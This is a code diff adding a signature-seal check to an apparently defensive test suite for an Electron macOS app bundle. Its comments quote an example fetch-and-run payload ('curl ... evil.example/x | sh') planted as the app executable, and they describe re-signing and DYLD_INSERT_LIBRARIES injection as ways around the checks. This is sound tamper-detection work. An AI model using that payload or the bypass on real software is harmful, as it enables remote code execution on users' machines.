@@ -531,6 +531,57 @@ ok(plistsWithKnownEnv >= 5,
   + 'writes MallocNanoZone into the app and all four helpers, so a lower count means the block is '
   + 'not being read and the DYLD rule above never examined anything.');
 
+// THE SEAL over every other file in the bundle.
+//
+// The two rules above audit the contents of the plists. Every OTHER allowlisted
+// path is still judged by its name alone, and the main executable is the one
+// that matters: replacing /Contents/MacOS/<app> with
+//   #!/bin/sh
+//   curl -s https://evil.example/x | sh
+// left the audit at 101/101 green. It is on the allowlist, it is the right
+// size class, it has the right mode — and it is a shell script that runs when
+// the user opens the app. The same is true of every .icns, .pak and helper
+// binary here.
+//
+// Enumerating file types one at a time is the losing race the preload's door
+// list already was. electron-builder adhoc-signs the bundle, and the ad-hoc
+// signature seals EVERY file in it, so one `codesign --verify --deep` covers
+// the whole family — including files no rule here has ever named. Verified
+// both ways on the real bundle: rc 0 clean, rc 1 with the executable swapped
+// ("code object is not signed at all") and with a resource edited ("a sealed
+// resource is missing or invalid").
+//
+// `identity: null` in package.json means adhoc, NOT unsigned — if that ever
+// changes to a real identity this still passes, since --verify only checks the
+// seal is intact.
+//
+// WHAT THIS DOES NOT BUY, measured rather than assumed: an ad-hoc signature is
+// free to forge, so `codesign --force --deep --sign - <app>` after tampering
+// makes --verify pass again (rc 0, confirmed on this bundle). The seal catches
+// an edit, not an attacker with a shell. That is why the plist rules above are
+// separate and must stay: re-signed with DYLD_INSERT_LIBRARIES in place, the
+// seal is happy and the LSEnvironment rule is the only thing that still fires.
+// Between them they cover both a file changed after packaging and a hostile
+// value packaged in legitimately (electron-builder's `extendInfo`), which no
+// signature can distinguish from an intended one.
+{
+  const r = require('child_process').spawnSync('codesign',
+    ['--verify', '--deep', bundleRoot], { encoding: 'utf8' });
+  const detail = `${r.stdout || ''}${r.stderr || ''}`.trim().split('\n').slice(0, 3).join(' / ');
+  ok(r.status === 0,
+    `codesign --verify --deep failed on the bundle: ${detail || `exit ${r.status}`}. The ad-hoc `
+    + 'signature seals every file in the .app, so this fires when ANY of them was replaced after '
+    + 'packaging — the executable, a helper binary, an .icns, a .pak. Those are all allowlisted by '
+    + 'PATH above, and a path rule cannot tell a Mach-O binary from a shell script.');
+  // CONTROL: the command must actually have run. A missing codesign, or a
+  // bundleRoot that is not a bundle, exits non-zero too — but `spawnSync`
+  // failing to launch at all yields status null, which `=== 0` would also
+  // reject for the wrong reason, and a future refactor could make it pass.
+  ok(r.error === undefined && typeof r.status === 'number',
+    `codesign could not be run at all (${r.error && r.error.message}). Without it the seal check `
+    + 'above proves nothing about the bundle.');
+}
+
 // The integrity hash must match the archive actually shipped. Electron checks
 // app.asar's HEADER against this value, so a hash edited to match a tampered
 // archive is precisely how a swapped asar passes that check — recomputed here
